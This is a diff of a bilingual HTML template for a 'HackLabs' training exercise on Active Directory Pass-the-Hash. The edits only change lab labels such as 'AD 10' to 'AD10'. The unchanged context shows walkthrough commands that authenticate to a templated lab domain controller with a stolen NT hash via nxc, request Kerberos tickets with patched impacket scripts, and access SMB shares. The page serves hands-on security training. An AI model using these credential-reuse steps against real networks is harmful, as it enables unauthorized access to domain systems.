@@ -1,5 +1,5 @@
 {% extends "base.html" %}
-{% block title %}AD 11 – Pass-the-Hash – HackLabs{% endblock %}
+{% block title %}AD11 – Pass-the-Hash – HackLabs{% endblock %}
 {% block content %}
 <div class="p-6 max-w-3xl mx-auto">
   {% include '_lab_header.html' %}
@@ -14,7 +14,7 @@
 
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
-    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Prerequisito: hash NT de a.miller obtenido en el lab AD 10 (DCSync)
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Prerequisito: hash NT de a.miller obtenido en el lab AD10 (DCSync)
 nxc smb {{ ad_dc_ip }} -u 'a.miller' -H '&lt;hash_NT_a.miller&gt;' --shares</pre>
   </div>
 </div>
@@ -25,7 +25,7 @@ nxc smb {{ ad_dc_ip }} -u 'a.miller' -H '&lt;hash_NT_a.miller&gt;' --shares</pre
     <p>En NTLM, el cliente nunca envía la contraseña: prueba que conoce su <em>hash NT</em> mediante un reto/respuesta. Por tanto el hash NT <strong>es</strong> la credencial: si lo tienes, puedes autenticarte sin conocer la contraseña en claro. Esto es <em>Pass-the-Hash</em>.</p>
 
     <h3>2 · Obtener el hash</h3>
-    <p>El hash de <code>a.miller</code> salió en el volcado NTDS del lab AD 10:</p>
+    <p>El hash de <code>a.miller</code> salió en el volcado NTDS del lab AD10:</p>
     <pre>a.miller:1108:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_a.miller&gt;:::
 
 # Nos quedamos solo con la parte NT (la que va detrás del segundo ':')
@@ -53,7 +53,7 @@ impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}</pre>
 python3 getTGT_fixed.py '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
 export KRB5CCNAME=a.miller.ccache
 klist</pre>
-    <p>El TGT ya es real y válido en este punto. El siguiente salto (pedir un TGS para <code>cifs/{{ ad_dc_host|lower }}</code> y usarlo contra SMB) topaba con un segundo bug de impacket, también real: <code>getKerberosTGS()</code> nunca manda el checksum <em>keyed</em> que RFC 4120 §5.5.1 exige en el Authenticator del TGS-REQ (key usage 6), y el KDC de Samba sí lo exige — sin él responde <code>KRB_AP_ERR_INAPP_CKSUM</code> (el mismo bug que bloqueaba Kerberoasting, ver AD 05). Con ese checksum añadido, el acceso SMB vía Kerberos funciona <strong>completamente en vivo</strong>:</p>
+    <p>El TGT ya es real y válido en este punto. El siguiente salto (pedir un TGS para <code>cifs/{{ ad_dc_host|lower }}</code> y usarlo contra SMB) topaba con un segundo bug de impacket, también real: <code>getKerberosTGS()</code> nunca manda el checksum <em>keyed</em> que RFC 4120 §5.5.1 exige en el Authenticator del TGS-REQ (key usage 6), y el KDC de Samba sí lo exige — sin él responde <code>KRB_AP_ERR_INAPP_CKSUM</code> (el mismo bug que bloqueaba Kerberoasting, ver AD05). Con ese checksum añadido, el acceso SMB vía Kerberos funciona <strong>completamente en vivo</strong>:</p>
     <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get smbclient_fixed.py'
 
 python3 smbclient_fixed.py -k -no-pass {{ ad_dc_fqdn }} -dc-ip {{ ad_dc_ip }}
@@ -87,7 +87,7 @@ nxc smb {{ ad_dc_ip }} -u 'a.miller' -H "$ADMILLER_NT" \
     <p>In NTLM the client never sends the password: it proves knowledge of its <em>NT hash</em> through a challenge/response. So the NT hash <strong>is</strong> the credential: if you have it, you can authenticate without knowing the cleartext. That is <em>Pass-the-Hash</em>.</p>
 
     <h3>2 · Get the hash</h3>
-    <p>The <code>a.miller</code> hash came out of the NTDS dump in lab AD 10:</p>
+    <p>The <code>a.miller</code> hash came out of the NTDS dump in lab AD10:</p>
     <pre>a.miller:1108:aad3b435b51404eeaad3b435b51404ee:&lt;a.miller_NT_hash&gt;:::
 
 # Keep just the NT part (after the second ':')
@@ -115,7 +115,7 @@ impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}</pre>
 python3 getTGT_fixed.py '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
 export KRB5CCNAME=a.miller.ccache
 klist</pre>
-    <p>The TGT is real and valid at this point. The next hop (requesting a TGS for <code>cifs/{{ ad_dc_host|lower }}</code> and using it against SMB) hit a second, equally real impacket bug: <code>getKerberosTGS()</code> never sends the <em>keyed</em> checksum RFC 4120 §5.5.1 requires in the TGS-REQ Authenticator (key usage 6), and Samba's KDC genuinely requires it — without it, it replies <code>KRB_AP_ERR_INAPP_CKSUM</code> (the same bug that blocked Kerberoasting, see AD 05). With that checksum added, Kerberos-based SMB access works <strong>fully live</strong>:</p>
+    <p>The TGT is real and valid at this point. The next hop (requesting a TGS for <code>cifs/{{ ad_dc_host|lower }}</code> and using it against SMB) hit a second, equally real impacket bug: <code>getKerberosTGS()</code> never sends the <em>keyed</em> checksum RFC 4120 §5.5.1 requires in the TGS-REQ Authenticator (key usage 6), and Samba's KDC genuinely requires it — without it, it replies <code>KRB_AP_ERR_INAPP_CKSUM</code> (the same bug that blocked Kerberoasting, see AD05). With that checksum added, Kerberos-based SMB access works <strong>fully live</strong>:</p>
     <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get smbclient_fixed.py'
 
 python3 smbclient_fixed.py -k -no-pass {{ ad_dc_fqdn }} -dc-ip {{ ad_dc_ip }}
